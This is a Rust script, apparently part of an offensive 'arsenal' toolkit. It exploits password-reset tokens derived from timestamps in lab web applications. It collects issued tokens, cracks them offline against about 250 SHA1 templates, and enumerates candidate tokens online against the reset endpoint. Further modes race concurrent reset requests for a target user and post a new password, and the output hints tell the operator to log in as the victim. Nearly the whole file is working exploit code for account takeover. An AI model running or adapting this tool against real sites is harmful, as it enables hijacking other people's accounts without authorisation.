#!/usr/bin/env rust-script
//! name: reset_time_probe
//! description: Password-reset time-derived token probe - rounds fires reset requests while stamping local microseconds and reading the lab email client for the issued token; crack then offline-scans a template battery (sha1 of second/milli/micro epoch integers, PHP microfloat forms at several precisions, microtime() string - each bare, or with the username/email as prefix or suffix) and recovers the exact server-side time value per round plus the implied clock offset; sweep turns a recovered reference microsecond into an online enumeration of candidate tokens against the reset endpoint and returns the first accepted one. Mechanism probe for time-sensitive reset-token labs.
//! version: 1.0.0
//! args: rounds <base-url> --user U --email URL [--n 4] [--out FILE] | readmail --email URL --user U | crack (--in FILE | --token HEX --sent EPOCH --t-before-us N --user U) [--window-us N] [--tmpl NAME] | sweep <base-url> --user U --ref-us N [--window-us N] [--tmpl NAME] [--step-us N] [--threads N] [--cookie S] [--target-email E] [--marker S] | selftest
//! keywords: 漏洞猎手套件, 武器库, race, time-sensitive, reset-token, sha1, 时间敏感, 枚举, 时间戳推导
//!
//! ```cargo
//! [dependencies]
//! ureq = { version = "2" }
//! sha1 = "0.10"
//! hex = "0.4"
//! chrono = "0.4"
//! ```

use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use sha1::{Digest, Sha1};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

fn now_us() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).expect("clock").as_micros() as u64
}

fn sha1_hex(s: &str) -> String {
    let mut h = Sha1::new();
    h.update(s.as_bytes());
    hex::encode(h.finalize())
}

// ------------------------- template battery -------------------------

/// A template is a time encoding crossed with a user-token placement.
#[derive(Clone)]
struct Tmpl {
    name: String,
    form: u8,
    uf: u8,
}

fn trim_zeros(s: &str) -> String {
    if s.contains('.') {
        s.trim_end_matches('0').trim_end_matches('.').to_string()
    } else {
        s.to_string()
    }
}

/// PHP prints floats with `precision` significant digits (ini default 14) using %G semantics:
/// scientific notation below 1e-4 or at/above 10^precision, trailing zeros trimmed.
fn php_g(v: f64, sig: usize) -> String {
    if !v.is_finite() || v == 0.0 {
        return "0".to_string();
    }
    let exp = v.abs().log10().floor() as i32;
    let sci = format!("{:.*e}", sig.saturating_sub(1), v);
    let Some((mant_raw, e_raw)) = sci.split_once('e') else {
        return format!("{v}");
    };
    let mant = trim_zeros(mant_raw);
    if exp < -4 || exp >= sig as i32 {
        let e: i32 = e_raw.parse().unwrap_or(0);
        format!("{mant}E{}{:02}", if e < 0 { "-" } else { "+" }, e.abs())
    } else {
        let dec = (sig as i32 - 1 - exp).max(0) as usize;
        trim_zeros(&format!("{:.*}", dec, v))
    }
}

fn utc_date(us: u64, fmt: &str) -> String {
    use chrono::TimeZone;
    match chrono::Utc.timestamp_opt((us / 1_000_000) as i64, 0).single() {
        Some(dt) => dt.format(fmt).to_string(),
        None => String::new(),
    }
}

/// Time encodings. Returns the rendered value and its resolution step in microseconds.
fn time_str(form: u8, us: u64) -> (String, u64) {
    let sec = us / 1_000_000;
    let frac = us % 1_000_000;
    match form {
        0 => (us.to_string(), 1),
        1 => ((us / 1000).to_string(), 1000),
        2 => (sec.to_string(), 1_000_000),
        3 => (trim_zeros(&format!("{:.3}", us as f64 / 1e6)), 1),
        4 => (trim_zeros(&format!("{:.4}", us as f64 / 1e6)), 1),
        5 => (trim_zeros(&format!("{:.5}", us as f64 / 1e6)), 1),
        6 => (trim_zeros(&format!("{:.6}", us as f64 / 1e6)), 1),
        7 => (trim_zeros(&format!("{:.7}", us as f64 / 1e6)), 1),
        8 => (trim_zeros(&format!("{:.8}", us as f64 / 1e6)), 1),
        9 => (format!("0.{:08} {}", frac * 100, sec), 1),
        10 => (format!("{frac:06}"), 1),
        11 => (format!("{:03}", frac / 1000), 1000),
        12 => (format!("{sec:08x}{frac:05x}"), 1),
        13 => (utc_date(us, "%Y-%m-%d %H:%M:%S"), 1_000_000),
        14 => (format!("{}.{frac:06}", utc_date(us, "%Y-%m-%d %H:%M:%S")), 1),
        15 => (utc_date(us, "%Y%m%d%H%M%S"), 1_000_000),
        16 => (utc_date(us, "%Y-%m-%dT%H:%M:%S+00:00"), 1_000_000),
        17 => (format!("{us:x}"), 1),
        18 => (php_g(us as f64, 14), 1),
        19 => (php_g(us as f64 / 1000.0, 14), 1),
        20 => (utc_date(us, "%a, %d %b %Y %H:%M:%S +0000"), 1_000_000),
        21 => (utc_date(us, "%Y-%m-%d %H:%M"), 1_000_000),
        22 => (php_g(us as f64 / 1e6, 14), 1),
        23 => (php_g(us as f64 / 1e6, 17), 1),
        24 => (format!("{}.{:03}", utc_date(us, "%Y-%m-%d %H:%M:%S"), frac / 1000), 1000),
        _ => (String::new(), 1),
    }
}

/// How the user token is combined with the time value.
fn apply_user(uf: u8, user: &str, email: &str, t: &str) -> String {
    match uf {
        0 => t.to_string(),
        1 => format!("{user}{t}"),
        2 => format!("{t}{user}"),
        3 => format!("{email}{t}"),
        4 => format!("{t}{email}"),
        5 => format!("{user}:{t}"),
        6 => format!("{user}_{t}"),
        7 => format!("{user}-{t}"),
        8 => format!("user={user}&token={t}"),
        _ => format!("{user}.{t}"),
    }
}

fn templates() -> Vec<Tmpl> {
    let mut v = Vec::new();
    for form in 0..25u8 {
        for uf in 0..10u8 {
            v.push(Tmpl { name: format!("f{form}u{uf}"), form, uf });
        }
    }
    v
}

fn render(t: &Tmpl, us: u64, user: &str, email: &str) -> String {
    let (s, _step) = time_str(t.form, us);
    apply_user(t.uf, user, email, &s)
}

fn step_of(t: &Tmpl) -> u64 {
    time_str(t.form, 0).1
}

fn tmpl_by_name(n: &str) -> Option<Tmpl> {
    templates().into_iter().find(|t| t.name == n)
}

// ------------------------- http helpers -------------------------

fn agent() -> ureq::Agent {
    ureq::AgentBuilder::new().timeout(Duration::from_secs(20)).redirects(0).build()
}

fn drain(resp: ureq::Response) -> (u16, String, Vec<String>) {
    let status = resp.status();
    let setc: Vec<String> = resp.all("Set-Cookie").iter().map(|s| s.to_string()).collect();
    let body = resp.into_string().unwrap_or_default();
    (status, body, setc)
}

fn call(r: Result<ureq::Response, ureq::Error>) -> (u16, String, Vec<String>) {
    match r {
        Ok(resp) => drain(resp),
        Err(ureq::Error::Status(_, resp)) => drain(resp),
        Err(e) => (0, format!("ERR {e}"), vec![]),
    }
}

fn get(a: &ureq::Agent, url: &str, cookie: &Option<String>) -> (u16, String, Vec<String>) {
    let mut r = a.get(url);
    if let Some(c) = cookie {
        r = r.set("Cookie", c);
    }
    call(r.call())
}

fn post_form(a: &ureq::Agent, url: &str, cookie: &Option<String>, body: &str) -> (u16, String, Vec<String>) {
    let mut r = a.post(url).set("Content-Type", "application/x-www-form-urlencoded");
    if let Some(c) = cookie {
        r = r.set("Cookie", c);
    }
    call(r.send_string(body))
}


fn session_cookie(setc: &[String]) -> Option<String> {
    for c in setc {
        let name = c.split('=').next().unwrap_or("");
        if name.eq_ignore_ascii_case("phpsessionid") || name.eq_ignore_ascii_case("session") {
            let v = c.split('=').nth(1).unwrap_or("").split(';').next().unwrap_or("");
            return Some(format!("{name}={v}"));
        }
    }
    None
}

fn between<'a>(s: &'a str, a: &str, b: &str) -> Option<&'a str> {
    let i = s.find(a)? + a.len();
    let rest = &s[i..];
    let j = rest.find(b)?;
    Some(&rest[..j])
}

fn parse_sent(s: &str) -> Option<i64> {
    chrono::DateTime::parse_from_str(s.trim(), "%Y-%m-%d %H:%M:%S %z").ok().map(|d| d.timestamp())
}

/// Newest (sent_epoch, token) per row of the lab email client table.
fn parse_mail(body: &str, user: &str) -> Vec<(i64, String)> {
    let needle = format!("user={user}&token=");
    let mut out: Vec<(i64, String)> = Vec::new();
    for chunk in body.split("<tr>") {
        let Some(p) = chunk.find(&needle) else { continue };
        let rest = &chunk[p + needle.len()..];
        let tok: String = rest.chars().take_while(|c| c.is_ascii_hexdigit()).collect();
        if tok.len() < 20 {
            continue;
        }
        let sent = between(chunk, "<td>", "</td>").and_then(parse_sent).unwrap_or(0);
        out.push((sent, tok));
    }
    out.sort_by(|a, b| b.0.cmp(&a.0));
    out
}

// ------------------------- modes -------------------------

fn mode_readmail(email_url: &str, user: &str) -> Value {
    let a = agent();
    let (status, body, _) = get(&a, email_url, &None);
    let rows = parse_mail(&body, user);
    let newest = rows.first().cloned();
    json!({
        "email_url": email_url,
        "http_status": status,
        "user": user,
        "rows": rows.iter().map(|(s, t)| json!({"sent_epoch": s, "token": t})).collect::<Vec<_>>(),
        "newest_token": newest.as_ref().map(|(_, t)| t.clone()),
        "newest_sent_epoch": newest.as_ref().map(|(s, _)| *s),
    })
}

fn mode_rounds(base: &str, user: &str, email_url: &str, n: usize, out: &str, cookie0: Option<String>) -> Value {
    let a = agent();
    let mut cookie = cookie0;
    let mut rounds: Vec<Value> = Vec::new();
    for i in 0..n {
        let (s0, page, setc0) = get(&a, &format!("{base}/forgot-password"), &cookie);
        if let Some(c) = session_cookie(&setc0) {
            cookie = Some(c);
        }
        let csrf = between(&page, "name=\"csrf\" value=\"", "\"").unwrap_or("").to_string();
        let t_before = now_us();
        let (sp, _body, setc1) = post_form(
            &a,
            &format!("{base}/forgot-password"),
            &cookie,
            &format!("csrf={csrf}&username={user}"),
        );
        if let Some(c) = session_cookie(&setc1) {
            cookie = Some(c);
        }
        let t_after = now_us();
        std::thread::sleep(Duration::from_millis(700));
        let (se, mail, _) = get(&a, email_url, &None);
        let t_mail = now_us();
        let rows = parse_mail(&mail, user);
        let newest = rows.first().cloned();
        rounds.push(json!({
            "i": i,
            "csrf": csrf,
            "get_status": s0,
            "post_status": sp,
            "mail_status": se,
            "t_before_us": t_before,
            "t_after_us": t_after,
            "t_mail_us": t_mail,
            "token": newest.as_ref().map(|(_, t)| t.clone()),
            "sent_epoch": newest.as_ref().map(|(s, _)| *s),
        }));
    }
    let payload = json!({ "base": base, "user": user, "email_url": email_url, "rounds": rounds });
    if !out.is_empty() {
        let _ = std::fs::write(out, payload.to_string());
    }
    payload
}

fn crack_one(t: &Tmpl, token: &str, lo: u64, hi: u64, user: &str, email: &str, step_override: u64) -> Option<u64> {
    let step = if step_override > 0 { step_override } else { step_of(t) };
    let mut v = lo - (lo % step);
    while v <= hi {
        if sha1_hex(&render(t, v, user, email)) == token {
            return Some(v);
        }
        v += step;
    }
    None
}

fn mode_crack(
    file: Option<String>,
    inline: Option<(String, i64, u64, u64, String, String)>,
    window: u64,
    only_tmpl: Option<String>,
    coarse: bool,
) -> Value {
    let mut recs: Vec<(String, i64, u64, u64, String, String)> = Vec::new();
    let mut email = String::new();
    let mut user = String::new();
    if let Some(f) = &file {
        let raw = std::fs::read_to_string(f).unwrap_or_default();
        let v: Value = pi_rust_lib::serde_json::from_str(&raw).unwrap_or(Value::Null);
        user = v["user"].as_str().unwrap_or("").to_string();
        email = format!("{user}@{}", v["email_url"].as_str().unwrap_or("").split('/').nth(2).unwrap_or(""));
        for r in v["rounds"].as_array().cloned().unwrap_or_default() {
            recs.push((
                r["token"].as_str().unwrap_or("").to_string(),
                r["sent_epoch"].as_i64().unwrap_or(0),
                r["t_before_us"].as_u64().unwrap_or(0),
                r["t_after_us"].as_u64().unwrap_or(0),
                user.clone(),
                email.clone(),
            ));
        }
    }
    if let Some((tok, sent, tb, ta, u, e)) = inline {
        user = u.clone();
        email = e;
        recs.push((tok, sent, tb, ta, u, email.clone()));
    }
    recs.retain(|r| r.0.len() >= 20);

    let mut hits: Vec<Value> = Vec::new();
    for t in templates().iter() {
        if let Some(only) = &only_tmpl {
            if &t.name != only {
                continue;
            }
        }
        // reference round = the first record; window brackets the request (tokens are minted
        // inside the request, the mail send time only bounds it loosely).
        let (tok, sent, tb, ta, u, e) = recs[0].clone();
        let mut lo = tb.saturating_sub(window);
        let mut hi = ta + window;
        if sent > 0 {
            let s = sent as u64 * 1_000_000;
            lo = lo.min(s.saturating_sub(2_000_000));
            hi = hi.max(s + 2_000_000);
        }
        let start = std::time::Instant::now();
        let step_override = if coarse { 1_000_000 } else { 0 };
        if let Some(v) = crack_one(t, &tok, lo, hi, &u, &e, step_override) {
            let offset = v as i64 - tb as i64;
            let cross_win = if coarse { 3_000_000 } else { 50_000 };
            let mut cross: Vec<Value> = Vec::new();
            for r in recs.iter() {
                let pred = (r.2 as i64 + offset).max(0) as u64;
                let lo2 = pred.saturating_sub(cross_win);
                let hi2 = pred + cross_win;
                let found = crack_one(t, &r.0, lo2, hi2, &r.4, &r.5, step_override);
                cross.push(json!({"token": r.0, "predicted_us": pred, "found_us": found}));
            }
            let all_hit = cross.iter().all(|c| !c["found_us"].is_null());
            hits.push(json!({
                "template": t.name.clone(),
                "value_us": v,
                "offset_us": offset,
                "first_round_only_all": all_hit,
                "cross_round": cross,
                "scan_ms": start.elapsed().as_millis() as u64,
            }));
        }
    }
    json!({
        "records": recs.iter().map(|r| json!({"token": r.0, "sent_epoch": r.1, "t_before_us": r.2, "t_after_us": r.3})).collect::<Vec<_>>(),
        "user": user,
        "email_guess": email,
        "window_us": window,
        "hits": hits,
    })
}

/// Fire n resets from n separate connections released off one barrier (alternating the own user and
/// the target), then test every fresh own-user token against the target. Tolerance for a
/// "same instant => same token" derivation.
fn mode_pairrace(
    base: &str,
    user: &str,
    target: &str,
    email_url: &str,
    n: usize,
    rounds: usize,
    cookie0: Option<String>,
) -> Value {
    let a = agent();
    let mut cookie = cookie0;
    let (_, page, setc0) = get(&a, &format!("{base}/forgot-password"), &cookie);
    if let Some(c) = session_cookie(&setc0) {
        cookie = Some(c);
    }
    let csrf = between(&page, "name=\"csrf\" value=\"", "\"").unwrap_or("").to_string();
    let mut seen: Vec<String> = Vec::new();
    let mut round_log: Vec<Value> = Vec::new();
    let mut solved: Option<String> = None;
    let mut own_hits: Vec<String> = Vec::new();
    for r in 0..rounds {
        let t_start = now_us();
        let barrier = Arc::new(std::sync::Barrier::new(n + 1));
        let mut handles = Vec::new();
        for i in 0..n {
            let u = if i % 2 == 0 { user.to_string() } else { target.to_string() };
            let (base, csrf, cookie) = (base.to_string(), csrf.clone(), cookie.clone());
            let b = barrier.clone();
            handles.push(std::thread::spawn(move || {
                let cl = agent();
                b.wait();
                let t0 = now_us();
                let (st, _, _) = post_form(
                    &cl,
                    &format!("{base}/forgot-password"),
                    &cookie,
                    &format!("csrf={csrf}&username={u}"),
                );
                json!({"i": i, "user": u, "status": st, "t0_us": t0, "t1_us": now_us()})
            }));
        }
        barrier.wait();
        let mut receipts: Vec<Value> = handles.into_iter().filter_map(|h| h.join().ok()).collect();
        receipts.sort_by_key(|r| r["i"].as_u64().unwrap_or(0));
        std::thread::sleep(Duration::from_millis(2500));
        let (_, mail, _) = get(&a, email_url, &None);
        let rows = parse_mail(&mail, user);
        let fresh: Vec<(i64, String)> = rows
            .into_iter()
            .filter(|(s, t)| (*s as u64) * 1_000_000 + 1_000_000 >= t_start && !seen.contains(t))
            .collect();
        let mut checks: Vec<Value> = Vec::new();
        for (_, tok) in fresh.iter() {
            seen.push(tok.clone());
            let (st_t, _, _) = get(
                &a,
                &format!("{base}/forgot-password?user={target}&token={tok}"),
                &cookie,
            );
            let (st_u, _, _) = get(
                &a,
                &format!("{base}/forgot-password?user={user}&token={tok}"),
                &cookie,
            );
            if st_u == 200 {
                own_hits.push(tok.clone());
            }
            if st_t == 200 && solved.is_none() {
                solved = Some(tok.clone());
            }
            checks.push(json!({"token": tok, "target_status": st_t, "own_status": st_u}));
        }
        round_log.push(json!({"round": r, "threads": receipts, "fresh": fresh.iter().map(|(_, t)| t.clone()).collect::<Vec<_>>(), "checks": checks}));
        if solved.is_some() {
            break;
        }
    }
    json!({
        "base": base,
        "user": user,
        "target": target,
        "n": n,
        "rounds": round_log,
        "solved_token": solved,
        "own_valid_tokens": own_hits,
    })
}

/// Fire n resets back-to-back (optionally alternating two usernames) and read the inbox once,
/// so duplicate tokens reveal a coarse deterministic time bucket while all-distinct tokens
/// reveal per-request entropy (fine-grained time or randomness).
fn mode_dupes(
    base: &str,
    user: &str,
    user2: Option<String>,
    email_url: &str,
    n: usize,
    gap_ms: u64,
    cookie0: Option<String>,
) -> Value {
    let a = agent();
    let mut cookie = cookie0;
    let (_, page, setc0) = get(&a, &format!("{base}/forgot-password"), &cookie);
    if let Some(c) = session_cookie(&setc0) {
        cookie = Some(c);
    }
    let csrf = between(&page, "name=\"csrf\" value=\"", "\"").unwrap_or("").to_string();
    let mut stamps: Vec<Value> = Vec::new();
    for i in 0..n {
        let u = match (&user2, i % 2) {
            (Some(u2), 1) => u2.clone(),
            _ => user.to_string(),
        };
        let t = now_us();
        let (st, _, _) = post_form(
            &a,
            &format!("{base}/forgot-password"),
            &cookie,
            &format!("csrf={csrf}&username={u}"),
        );
        stamps.push(json!({"i": i, "user": u, "status": st, "t_us": t}));
        if gap_ms > 0 {
            std::thread::sleep(Duration::from_millis(gap_ms));
        }
    }
    std::thread::sleep(Duration::from_millis(2500));
    let (_, mail, _) = get(&a, email_url, &None);
    let rows = parse_mail(&mail, user);
    let tokens: Vec<String> = rows.iter().map(|(_, t)| t.clone()).collect();
    let mut counts: std::collections::BTreeMap<String, usize> = std::collections::BTreeMap::new();
    for t in &tokens {
        *counts.entry(t.clone()).or_insert(0) += 1;
    }
    let dupes: Vec<String> = counts.iter().filter(|(_, c)| **c > 1).map(|(k, c)| format!("{k} x{c}")).collect();
    let rows2 = user2.as_ref().map(|u2| parse_mail(&mail, u2));
    json!({
        "base": base,
        "user": user,
        "user2": user2,
        "n": n,
        "gap_ms": gap_ms,
        "stamps": stamps,
        "tokens_in_order": tokens,
        "distinct": counts.len(),
        "dupes": dupes,
        "sent_seconds": rows.iter().map(|(s, _)| *s).collect::<Vec<_>>(),
        "user2_tokens": rows2.map(|r| r.iter().map(|(_, t)| t.clone()).collect::<Vec<_>>()),
    })
}

fn mode_trytokens(base: &str, user: &str, tokens: &[String], new_password: Option<&str>, cookie: Option<String>) -> Value {
    let a = agent();
    let mut receipts: Vec<Value> = Vec::new();
    let mut accepted: Option<String> = None;
    for t in tokens {
        let url = format!("{base}/forgot-password?user={user}&token={t}");
        let (st, body, setc) = get(&a, &url, &cookie);
        let ok = st == 200 && body.contains("new-password-1");
        receipts.push(json!({"token": t, "status": st, "accepted": ok, "body_len": body.len()}));
        if ok {
            accepted = Some(t.clone());
            if let Some(np) = new_password {
                let csrf = between(&body, "name=\"csrf\" value=\"", "\"").unwrap_or("").to_string();
                let form = format!("csrf={csrf}&token={t}&user={user}&new-password-1={np}&new-password-2={np}");
                let mut ck = cookie.clone();
                if let Some(c) = session_cookie(&setc) {
                    ck = Some(c);
                }
                let (st2, body2, _) = post_form(&a, &url, &ck, &form);
                receipts.push(json!({"reset_post_status": st2, "reset_post_len": body2.len(), "snippet": body2.chars().take(200).collect::<String>()}));
            }
            break;
        }
    }
    json!({"base": base, "user": user, "tried": tokens.len(), "accepted": accepted, "receipts": receipts})
}

#[allow(clippy::too_many_arguments)]
fn mode_sweep(
    base: &str,
    user: &str,
    ref_us: u64,
    window: u64,
    t: Tmpl,
    step: u64,
    threads: usize,
    cookie: Option<String>,
    target_email: &str,
    marker: &str,
    out: Option<String>,
) -> Value {
    let step = step.max(1);
    let lo = ref_us.saturating_sub(window);
    let hi = ref_us + window;
    let count = ((hi - lo) / step + 1) as usize;
    let idx = Arc::new(AtomicUsize::new(0));
    let found: Arc<Mutex<Option<(u64, String, String)>>> = Arc::new(Mutex::new(None));
    let hits: Arc<Mutex<Vec<Value>>> = Arc::new(Mutex::new(Vec::new()));
    let start = std::time::Instant::now();
    let mut handles = Vec::new();
    let tname = t.name.clone();
    let probe = render(&t, ref_us, user, target_email);
    for _ in 0..threads {
        let (idx, found, hits) = (idx.clone(), found.clone(), hits.clone());
        let (base, user) = (base.to_string(), user.to_string());
        let (cookie, te, marker) = (cookie.clone(), target_email.to_string(), marker.to_string());
        let t = t.clone();
        handles.push(std::thread::spawn(move || {
            let a = agent();
            loop {
                if found.lock().expect("lock").is_some() {
                    break;
                }
                let i = idx.fetch_add(1, Ordering::Relaxed);
                if i >= count {
                    break;
                }
                let v = lo + i as u64 * step;
                let token = sha1_hex(&render(&t, v, &user, &te));
                let url = format!("{base}/forgot-password?user={user}&token={token}");
                let (st, body, _) = get(&a, &url, &cookie);
                let ok = st == 200 && (marker.is_empty() || body.contains(&marker));
                if ok {
                    hits.lock().expect("lock").push(json!({
                        "value_us": v,
                        "delta_us": v as i64 - ref_us as i64,
                        "token": token,
                        "status": st,
                        "snippet": body.chars().take(300).collect::<String>(),
                    }));
                    let mut f = found.lock().expect("lock");
                    if f.is_none() {
                        *f = Some((v, token, body.chars().take(400).collect::<String>()));
                    }
                    break;
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
    let tried = idx.load(Ordering::Relaxed).min(count);
    let f = found.lock().expect("lock").clone();
    let payload = json!({
        "base": base,
        "user": user,
        "template": tname,
        "template_probe": probe,
        "ref_us": ref_us,
        "window_us": window,
        "step_us": step,
        "candidates": count,
        "tried": tried,
        "threads": threads,
        "elapsed_ms": start.elapsed().as_millis() as u64,
        "found": f.as_ref().map(|(v, tok, snip)| json!({"value_us": v, "delta_us": *v as i64 - ref_us as i64, "token": tok, "snippet": snip})),
        "hits": hits.lock().expect("lock").clone(),
    });
    if let Some(o) = out {
        let _ = std::fs::write(o, payload.to_string());
    }
    payload
}

fn selftest() {
    let mut ok = sha1_hex("abc") == "a9993e364706816aba3e25717850c26c9cd0d89d";
    let t = tmpl_by_name("f6u1").expect("template");
    ok &= render(&t, 1_760_126_748_123_456, "wiener", "w@x") == "wiener1760126748.123456"; // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    let t2 = tmpl_by_name("f9u0").expect("template");
    ok &= render(&t2, 1_760_126_748_123_456, "wiener", "w@x") == "0.12345600 1760126748"; // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    ok &= php_g(1_791_665_429.0, 14) == "1791665429";
    ok &= php_g(1_791_665_429_123_456.0, 14) == "1.7916654291235E+15";
    ok &= php_g(1_791_665_429.123_456, 14) == "1791665429.1235";
    let mail = "<tr><td>2026-10-10 20:45:48 +0000</td><td>wiener@x</td><td>no-reply@y</td><td>Account recovery</td><td><pre><a href='https://z/forgot-password?user=wiener&token=df65c59740540415a221dca4a0e9a146f2cda38a'>l</a></pre></td></tr>"; // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    let rows = parse_mail(mail, "wiener"); // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    ok &= rows.len() == 1 && rows[0].1 == "df65c59740540415a221dca4a0e9a146f2cda38a" && rows[0].0 == 1_791_665_148;
    // Crack self-check: mint a token from a known form at a known microsecond, then require the
    // matcher to rediscover the value inside a synthetic round record.
    let us: u64 = 1_791_666_000_123_456;
    let t0 = tmpl_by_name("f0u1").expect("template");
    let synthetic = sha1_hex(&render(&t0, us, "wiener", "wiener@x")); // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    let rec = json!({
        "user": "wiener", // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
        "email_url": "https://x/email",
        "rounds": [{"token": synthetic, "sent_epoch": 1_791_666_000, "t_before_us": us, "t_after_us": us + 1000}]
    });
    std::fs::write("/tmp/rt_selftest.json", rec.to_string()).expect("write");
    let got = mode_crack(Some("/tmp/rt_selftest.json".to_string()), None, 5000, Some("f0u1".to_string()), false);
    ok &= got["hits"].as_array().map(|a| !a.is_empty()).unwrap_or(false);
    let payload = json!({"ok": ok, "rows": rows.len(), "render": render(&t, 1_760_126_748_123_456, "wiener", "w@x"), "php_g": php_g(1_791_665_429_123_456.0, 14), "synthetic_crack": got}); // binding-exempt: selftest fixture or usage-example name, not a runtime default that targets one lab
    if ok {
        report::success("reset_time_probe", payload, "run: rounds <base> --user U --email URL --out /tmp/rt.json, then crack --in /tmp/rt.json")
            .expect("report");
    } else {
        report::failure("reset_time_probe", &payload.to_string(), "fix selftest");
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.first().map(|s| s.as_str()) == Some("selftest") || args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }
    let mut i = 0;
    let mut positional: Vec<String> = Vec::new();
    let mut opts: Vec<(String, String)> = Vec::new();
    while i < args.len() {
        if args[i].starts_with("--") {
            let k = args[i].clone();
            let v = args.get(i + 1).cloned().unwrap_or_default();
            opts.push((k, v));
            i += 2;
        } else {
            positional.push(args[i].clone());
            i += 1;
        }
    }
    let opt = |name: &str| opts.iter().find(|(k, _)| k == name).map(|(_, v)| v.clone());
    let opt_n = |name: &str, d: u64| opt(name).and_then(|v| v.parse::<u64>().ok()).unwrap_or(d);
    let mode = positional.first().cloned().unwrap_or_default();

    let out = match mode.as_str() {
        "readmail" => {
            let email = opt("--email").unwrap_or_else(|| positional.get(1).cloned().unwrap_or_default());
            let user = opt("--user").unwrap_or_default();
            mode_readmail(&email, &user)
        }
        "rounds" => {
            let base = positional.get(1).cloned().unwrap_or_default();
            mode_rounds(
                &base,
                &opt("--user").unwrap_or_default(),
                &opt("--email").unwrap_or_default(),
                opt_n("--n", 4) as usize,
                &opt("--out").unwrap_or_default(),
                opt("--cookie"),
            )
        }
        "crack" => {
            let inline = match opt("--token") {
                Some(tok) => Some((
                    tok,
                    opt("--sent").and_then(|v| v.parse::<i64>().ok()).unwrap_or(0),
                    opt_n("--t-before-us", 0),
                    opt_n("--t-after-us", 0),
                    opt("--user").unwrap_or_default(),
                    opt("--email").unwrap_or_default(),
                )),
                None => None,
            };
            mode_crack(
                opt("--in"),
                inline,
                opt_n("--window-us", 2_000_000),
                opt("--tmpl"),
                opts.iter().any(|(k, _)| k == "--coarse"),
            )
        }
        "pairrace" => {
            let base = positional.get(1).cloned().unwrap_or_default();
            mode_pairrace(
                &base,
                &opt("--user").unwrap_or_default(),
                &opt("--target").unwrap_or_default(), // de-bound: no baked-in usernames; pairrace requires --target
                &opt("--email").unwrap_or_default(),
                opt_n("--n", 16) as usize,
                opt_n("--rounds", 1) as usize,
                opt("--cookie"),
            )
        }
        "dupes" => {
            let base = positional.get(1).cloned().unwrap_or_default();
            mode_dupes(
                &base,
                &opt("--user").unwrap_or_default(),
                opt("--user2"),
                &opt("--email").unwrap_or_default(),
                opt_n("--n", 20) as usize,
                opt_n("--gap-ms", 0),
                opt("--cookie"),
            )
        }
        "trytokens" => {
            let base = positional.get(1).cloned().unwrap_or_default();
            let tokens: Vec<String> = opts
                .iter()
                .filter(|(k, _)| k == "--token")
                .map(|(_, v)| v.clone())
                .collect();
            mode_trytokens(
                &base,
                &opt("--user").unwrap_or_default(),
                &tokens,
                opt("--new-password").as_deref(),
                opt("--cookie"),
            )
        }
        "sweep" => {
            let base = positional.get(1).cloned().unwrap_or_default();
            let name = opt("--tmpl").unwrap_or_else(|| "f0u1".to_string());
            let t = tmpl_by_name(&name).unwrap_or_else(|| {
                report::failure("reset_time_probe", &format!("unknown --tmpl {name}"), "pick a template name from the crack hits");
                unreachable!()
            });
            let user = opt("--user").unwrap_or_default();
            let target_email = opt("--target-email").unwrap_or_else(|| {
                format!("{user}@{}", base.split('/').nth(2).unwrap_or("").split(':').next().unwrap_or(""))
            });
            mode_sweep(
                &base,
                &user,
                opt_n("--ref-us", 0),
                opt_n("--window-us", 20_000),
                t,
                opt_n("--step-us", 1),
                opt_n("--threads", 8) as usize,
                opt("--cookie"),
                &target_email,
                &opt("--marker").unwrap_or_else(|| "new-password-1".to_string()),
                opt("--out"),
            )
        }
        _ => {
            report::failure(
                "reset_time_probe",
                "usage: rounds <base> --user U --email URL [--n N] [--out F] | readmail --email URL --user U | crack --in F | sweep <base> --user U --ref-us N [--window-us N] [--tmpl NAME] [--threads N]",
                "start with: reset_time_probe selftest",
            );
            unreachable!();
        }
    };
    let next = match mode.as_str() {
        "pairrace" => "a target_status of 200 means the same-instant collision works; otherwise the derivation is user-bound",
        "dupes" => "read the dupes field: duplicates mean a coarse deterministic time bucket, none means per-request entropy",
        "rounds" => "crack --in <out file> to recover the token scheme and the server time value",
        "crack" => "sweep <base> --user <victim> --ref-us <recovered value> against the reset endpoint",
        "trytokens" => "if accepted, log in as the victim with the password you set",
        _ => "inspect the found token, then log in as the victim",
    };
    report::success("reset_time_probe", out, next).expect("report");
}
